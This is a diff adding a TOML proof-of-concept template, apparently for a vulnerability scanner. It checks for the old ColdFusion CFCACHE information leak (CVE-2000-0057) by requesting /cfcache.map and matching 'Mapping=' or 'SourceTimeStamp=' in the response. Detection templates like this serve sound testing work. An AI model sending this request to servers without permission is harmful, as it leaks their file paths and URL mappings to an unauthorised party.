@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "Allaire ColdFusion Server 4.0/4.0.1 的 CFCACHE 标签在处理缓存时会创建临时文件（.tmp）和 cfcache.map 映射文件，这些文件存储在 Web 文档根目录下且未设访问限制。远程攻击者通过直接请求 /cfcache.map 即可获取包含绝对路径、时间戳、URL 映射等敏感信息的缓存映射文件，进而获得系统敏感信息。"
+id = "POC-AVE-2000-0111"
+name = "Allaire ColdFusion Server CFCACHE 信息泄露漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0111"]
+vuln_id = [
+    "CVE-2000-0057",
+    "AVE-2000-0111",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/cfcache.map"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Mapping=",
+    "SourceTimeStamp=",
+]
